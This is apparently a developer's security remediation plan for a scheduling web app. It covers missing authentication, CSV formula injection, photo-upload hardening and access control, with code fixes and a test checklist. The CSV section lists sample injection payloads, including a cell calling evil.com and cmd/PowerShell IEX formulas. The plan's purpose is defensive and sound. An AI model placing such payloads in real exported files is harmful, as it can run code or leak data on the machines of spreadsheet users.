# Phase 01: Security Fixes

**Priority:** CRITICAL ⚠️
**Estimated Effort:** 3-4 days
**Risk:** High (production data exposure)

## Scope

Fix authentication gaps, injection vulnerabilities, and unauthorized access in schedule execution system.

## Issues to Fix

### 1. Unauthenticated API Routes
**Files:**
- `src/app/api/schedules/[id]/briefing/route.ts`
- `src/app/api/schedules/export/route.ts`

**Problem:**
```typescript
// Missing authentication check
export async function GET(request: Request) {
  // Anyone can access schedules by guessing IDs
  const schedule = await db.schedule.findUnique(...);
}
```

**Fix:**
```typescript
import { auth } from "@/lib/auth";

export async function GET(request: Request) {
  const session = await auth();
  if (!session?.user) {
    return new Response("Unauthorized", { status: 401 });
  }

  // Verify user has access to this schedule's contract
  const schedule = await db.schedule.findUnique({
    where: { id },
    include: { contract: { include: { customer: true } } }
  });

  // Add authorization logic (e.g., admin or assigned staff)
}
```

### 2. CSV Injection Vulnerability
**File:** `src/app/api/schedules/export/route.ts:45-60`

**Problem:**
```typescript
// No sanitization - Excel executes formulas!
const row = [
  schedule.notes, // Could be "=1+1" or "=HYPERLINK(...)"
  customer.name,  // Could be "+cmd|'/c calc'!A1"
];
```

**Attack Vector:**
```csv
ID,Notes
1,"=1+1|'http://evil.com/?'!A1"
2,"+cmd|'/c calc'!A1"
3,"-2+3+cmd|'/c powershell IEX'!A1"
4,"@SUM(1+1)*cmd|'/c notepad'!A1"
```

**Fix:**
```typescript
function sanitizeCSVCell(value: string | null | undefined): string {
  if (!value) return '';

  const str = String(value);

  // Neutralize formula injection
  if (/^[=+\-@]/.test(str)) {
    return `'${str}`; // Prefix with single quote
  }

  // Escape quotes
  return str.replace(/"/g, '""');
}

// Usage:
const row = [
  sanitizeCSVCell(schedule.notes),
  sanitizeCSVCell(customer.name),
];
```

### 3. Photo Upload Security
**File:** `src/actions/schedules.ts:350-400` (completeSchedule)

**Problem:**
```typescript
// Accepts any URL - no validation!
photos: z.array(z.string().url()).optional(),

// Stores full URLs - exposing storage details
await db.scheduleExecution.create({
  data: {
    afterPhotos: ['https://storage.googleapis.com/bucket/sensitive-path/photo.jpg']
  }
});
```

**Risks:**
- Client can submit malicious URLs (phishing links)
- Full storage paths leaked in API responses
- No signature verification (anyone can upload to your bucket)

**Fix:**

**Step 1:** Update schema to relative paths:
```typescript
// src/lib/validations/schedule.ts
photos: z.array(
  z.string()
    .regex(/^schedules\/[\w-]+\/[\w-]+\.jpg$/, 'Invalid photo path')
    .max(200)
).optional(),
```

**Step 2:** Generate signed upload URLs (server-side):
```typescript
// New action: src/actions/schedules.ts
export async function generatePhotoUploadUrl(scheduleId: string) {
  const session = await auth();
  if (!session?.user) throw new Error("Unauthorized");

  // Verify user is assigned to this schedule
  const schedule = await db.schedule.findUnique({
    where: { id: scheduleId },
    include: { execution: true }
  });

  if (schedule?.execution?.assignedStaffId !== session.user.id) {
    throw new Error("Not assigned to this schedule");
  }

  // Generate signed URL (expires in 1 hour)
  const photoId = nanoid();
  const path = `schedules/${scheduleId}/${photoId}.jpg`;

  const signedUrl = await storage.generateSignedUploadUrl(path, {
    expiresIn: 3600,
    contentType: 'image/jpeg',
    maxSize: 5 * 1024 * 1024, // 5MB
  });

  return { signedUrl, path };
}
```

**Step 3:** Client-side usage:
```typescript
// Get signed URL from server
const { signedUrl, path } = await generatePhotoUploadUrl(scheduleId);

// Upload directly to storage
await fetch(signedUrl, {
  method: 'PUT',
  body: photoBlob,
  headers: { 'Content-Type': 'image/jpeg' }
});

// Submit relative path to completeSchedule
await completeSchedule(scheduleId, {
  photos: [path], // Only path, not full URL
});
```

**Step 4:** Serve photos with signed read URLs:
```typescript
// src/actions/schedules.ts
export async function getSchedulePhotos(scheduleId: string) {
  const session = await auth();
  if (!session?.user) throw new Error("Unauthorized");

  const execution = await db.scheduleExecution.findUnique({
    where: { scheduleId },
    select: { afterPhotos: true }
  });

  // Generate signed read URLs (expires in 1 hour)
  const signedUrls = await Promise.all(
    execution.afterPhotos.map(path =>
      storage.generateSignedReadUrl(path, { expiresIn: 3600 })
    )
  );

  return signedUrls;
}
```

### 4. State Transition Access Control
**File:** `src/actions/schedules.ts:250-450`

**Problem:**
```typescript
// Anyone authenticated can start/arrive/complete ANY schedule!
export async function startSchedule(scheduleId: string) {
  const session = await auth();
  if (!session?.user) throw new Error("Unauthorized");

  // Missing: Is this user ASSIGNED to this schedule?
  await db.scheduleExecution.update({
    where: { scheduleId },
    data: { startedAt: new Date() }
  });
}
```

**Fix:**
```typescript
export async function startSchedule(scheduleId: string) {
  const session = await auth();
  if (!session?.user) throw new Error("Unauthorized");

  const schedule = await db.schedule.findUnique({
    where: { id: scheduleId },
    include: { execution: true }
  });

  // Authorization: Only assigned staff or admins
  const isAssigned = schedule?.execution?.assignedStaffId === session.user.id;
  const isAdmin = session.user.role === 'ADMIN';

  if (!isAssigned && !isAdmin) {
    throw new Error("Not authorized to modify this schedule");
  }

  // Proceed with update...
}
```

## Implementation Steps

### Step 1: Add Authentication Middleware (Day 1)
1. Create `src/lib/auth-helpers.ts`:
   ```typescript
   export async function requireAuth() {
     const session = await auth();
     if (!session?.user) throw new Error("Unauthorized");
     return session;
   }

   export async function requireScheduleAccess(scheduleId: string, userId: string) {
     const schedule = await db.schedule.findUnique({
       where: { id: scheduleId },
       include: { execution: true, contract: true }
     });

     const isAssigned = schedule?.execution?.assignedStaffId === userId;
     const isAdmin = await checkAdminRole(userId);

     if (!isAssigned && !isAdmin) {
       throw new Error("Access denied");
     }

     return schedule;
   }
   ```

2. Add to all API routes and actions

### Step 2: Fix CSV Injection (Day 1)
1. Create `src/lib/csv-utils.ts` with `sanitizeCSVCell()`
2. Update `src/app/api/schedules/export/route.ts`
3. Add test cases in `src/__tests__/csv-injection.test.ts`

### Step 3: Photo Upload Refactor (Day 2-3)
1. Implement `generatePhotoUploadUrl()` action
2. Update client-side photo upload flow
3. Add `getSchedulePhotos()` for signed read URLs
4. Migrate existing full URLs to relative paths (DB migration)

### Step 4: Access Control Enforcement (Day 3-4)
1. Update all schedule actions with `requireScheduleAccess()`
2. Add role-based tests
3. Audit log for unauthorized access attempts

## Testing Checklist

- [ ] Unauthenticated requests return 401
- [ ] Non-assigned staff cannot modify schedules
- [ ] CSV with `=1+1` renders as `'=1+1` (not executed)
- [ ] Malicious URLs rejected by photo upload validation
- [ ] Signed URLs expire after 1 hour
- [ ] Photo upload fails without valid signature
- [ ] Admin can access all schedules
- [ ] Staff only see assigned schedules

## Success Criteria

- Zero unauthenticated API routes
- CSV injection test suite passes
- Photos use signed URLs (no direct storage paths)
- Access control tests pass for all roles

## Rollback Plan

- Feature flag: `ENABLE_STRICT_AUTH=false` (emergency bypass)
- Keep legacy photo URL format in DB (add `legacyPhotoUrls` column)
- CSV export: Keep old endpoint at `/api/schedules/export/legacy`

## Unresolved Questions

- Should we rate-limit photo uploads (prevent abuse)?
- Do we need audit logs for failed access attempts?
- Which storage provider for signed URLs (Cloudflare R2, GCS, S3)?
